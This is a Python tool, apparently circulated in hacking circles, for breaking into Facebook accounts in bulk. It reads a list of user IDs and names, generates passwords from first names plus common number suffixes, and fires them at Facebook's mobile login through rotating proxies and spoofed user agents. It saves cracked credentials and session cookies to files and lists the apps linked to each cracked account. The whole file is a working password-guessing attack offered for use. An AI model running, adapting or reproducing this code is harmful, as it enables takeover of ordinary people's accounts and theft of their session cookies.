import time, datetime, os

now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
hours = now.hour
x = datetime.datetime.now()
g = datetime.datetime(2023, 11,20 , 10, 00, 00)
if x.strftime('%x') > g.strftime('%x'):
    print("\033[1;31m SCRIPT RAGIRA\n\033[1;32m BOKRINI SCRIPT NAMA BO @QWTA404M BNERA")
    os.system('xdg-open https://t.me/Qwta404m')
    exit()
import os
try:
    import requests
except ImportError:
    print('\n [×] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module not installed!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module not installed!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64
from concurrent.futures import ThreadPoolExecutor as AzimVau
from datetime import datetime
from bs4 import BeautifulSoup
def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
os.system("pip install marshal")
try:
	prox= requests.get('https://github.com/DFD4x/TOOLxFB/blob/main/.DFD-IP.txt').text
	open('.DFD-IP.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.DFD-IP.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('DFD-MOBILE.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/HamaCracker1/List/blob/main/list.txt').text
		ua=open('.DFD-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.DFD-MOBILE.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
############################ RESPONSE FACEBOOK ###########################################
#############
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
import marshal
def banner():
	clear()
	print(f"""
\033[1;91m.     
                        .___________.  ______   .______   
                        |           | /  __  \  |   _  \  
                        `---|  |----`|  |  |  | |  |_)  | 
                            |  |     |  |  |  | |   ___/  
                            |  |     |  `--'  | |  |      
                            |__|      \______/  | _|      
                                                            
                                                                                        
     \033[1;32m[•]═════════════════════════════════[•]
        \033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;91m: \033[1;97mTOP \033[1;92m            
        \033[1;97m[\033[1;92m❯\033[1;97m]MY BRO    \033[1;91m: \033[1;97mR4ykoo \033[1;92m      
        \033[1;97m[\033[1;92m❯\033[1;97m]R4ykoo GROUP  \033[1;91m: \033[1;97m1997-STAFF\033[1;92m 
        \033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mTOOLS     \033[38;5;196m: \033[1;97mFILE+ID CLONE        \033[38;5;46m
        \033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mNETWORK   \033[38;5;196m: \033[1;97m3G\033[97;1m,FTTH 4G,WIFI   \033[38;5;46m  
        \033[1;97m[\033[1;92m❯\033[1;97m]\033[97;1mVERSION   \033[38;5;196m: \033[1;97m1.1     \033[38;5;46m          
     \033[1;32m[•]═════════════════════════════════[•]""")
# LOGIN
# new cooki 
def login():
	os.system('clear')
	banner()
		
	
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "".join(uuid)
	
	print("")
	print("")
	print('\033[1;34m%s[ 1 ] %s\033[1;31m01%s%s \033[1;31mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))
	print('\033[1;34m%s[ E ] %s\033[1;34m00%s%s \033[1;34mEXIT %s%s%s'%(P,H,P,H,P,H,P))
	print("")
	dark = input('%s%s%s%s\033[1;34m  CHOOSE %s\033[1;37m : '%(N,H,N,H,M))
	print('')
	if dark in ['1','01']:
		crack_file()
	elif dark in ['0','00']:
		print(' [OK] LOGIN ACCOUNT ')
		exit()
# PUBLIC CRACK

def crack_file():

	


    
	o = input('\x1b[1;97m [+] FILE NAME : ')

	print('')

	try:lin = open(o).read().splitlines()

	except:

		print('File Not Found')

		time.sleep(2)

		menu()

	for xid in lin:

		id.append(xid)

	setting()
#-------------[ -SETTING ]---------------#
def setting():
	banner()
	print(' TOTAL IDS : '+str(len(id)))
	print(' [1] RANDOM ')
	print("")

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\n\n')
		exit()
	banner()
	print('[01] WI-FI 2G 3G 4G 5G FTTH ')
	print("")
	method.append('mobile')
	banner()
	print("""
	1 > password (1)
	2 > password (2) """)
	dark = input(' CHOICE : ')
	if dark in ['01','1']:
		passwrd()
	if dark in ['02','2']:
		passwrd3()
	exit() 
# Method Main
def passwrd():
	banner()
	print("")
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append(frs+frs)

			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append(frs+frs)
					


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd1():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'12273')
					pwv.append(frs+'127234')
					pwv.append(frs+'1238245')
					pwv.append(frs+'12')
					pwv.append(frs+'11911')
					pwv.append(frs+'181212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'000880')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@12386')
					pwv.append(frs+'17923@')
					pwv.append(frs+'890000')
					pwv.append(frs+frs)
					
			else:
					pwv.append(nmf)
					pwv.append(frs+'1823')
					pwv.append(frs+'187234')
					pwv.append(frs+'12345')
					pwv.append(frs+'182')
					pwv.append(frs+'118211')
					pwv.append(frs+'18289212')
					pwv.append(frs+'12382123')
					pwv.append(frs+'192234512345')
					pwv.append(frs+'082000')
					pwv.append(frs+'1010')
					pwv.append(frs+'892123@')
					pwv.append(frs+'@12823')
					pwv.append(frs+'8w123@')
					pwv.append(frs+'87000')
					pwv.append(frs+frs)
					

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd2():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=20) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(nmf)
			else:
					pwv.append(nmf)
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd3():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd4():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd5():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'1239')
					pwv.append(frs+'12534')
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'1111')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'0000')
					pwv.append(frs+'91010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'1238@')
					pwv.append(frs+'00800')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("1990031990")
					pwv.append("12345678900")
					pwv.append("1990851995")
					pwv.append("2001206501")
					pwv.append("2002200502")
					pwv.append("2003289003")
					pwv.append("2004200704")
					pwv.append("2005203005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'17223')
					pwv.append(frs+'127234')
					pwv.append(frs+'1228345')
					pwv.append(frs+'1122')
					pwv.append(frs+'118911')
					pwv.append(frs+'8811')
					pwv.append(frs+'123123')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'000009')
					pwv.append(frs+'10010')
					pwv.append(frs+'1823@')
					pwv.append(frs+'@123')
					pwv.append(frs+'1123@')
					pwv.append(frs+'0000')
					pwv.append("112233445765")
					pwv.append("12345912345")
					pwv.append("199057661990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("2001253001")
					pwv.append("2002122002")
					pwv.append("2830032003")
					pwv.append("2004042004")
					pwv.append("2008952005")


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd7():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'1723')
					pwv.append(frs+'12340')
					pwv.append(frs+'12345')
					pwv.append(frs+'612')
					pwv.append(frs+'11118')
					pwv.append(frs+'12152')
					pwv.append(frs+'123123')
					pwv.append(frs+'12345512345')
					pwv.append(frs+'000900')
					pwv.append(frs+'10910')
					pwv.append(frs+'1239@')
					pwv.append(frs+'@8123')
					pwv.append(frs+'9123@')
					pwv.append(frs+'0000')
					pwv.append("11223394455")
					pwv.append("123451923845")
					pwv.append("19909901990")
					pwv.append("123495678900")
					pwv.append("199519995")
					pwv.append("200129001")
					pwv.append("200220902")
					pwv.append("200329003")
					pwv.append("200429004")
					pwv.append("200529005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'1239')
					pwv.append(frs+'12348')
					pwv.append(frs+'123456')
					pwv.append(frs+'124')
					pwv.append(frs+'11112')
					pwv.append(frs+'12123')
					pwv.append(frs+'1231234')
					pwv.append(frs+'12345123465')
					pwv.append(frs+'00000')
					pwv.append(frs+'1010')
					pwv.append(frs+'123@')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'0000')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r Hamo {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;34mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
   "path": '/',
   "scheme": 'https',
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2102J20SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				print(f'\r{K} [ Hamo😭-CP ] ID : {idf}  [+] PASSWORD : {pw}{N} ')       
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} [ Hamo☠️-OK ]\n ID : {idf} : {pw} : {kuki}')
				#
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_H4M404(kuki)
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} [ Hamo☠️-OK ]\n ID : {idf} : {pw} : {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ CHECK APP ]--------------------#   
def cek_H4M404(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s\033[97m %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r%s\033[0mcookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s\033[0m %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r%s \033[0mcookie invalid"%(M))
#------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch TOP-IP.txt')
	except:pass
	try:os.system('touch TOP-IP.txt')
	except:pass
	login()
	
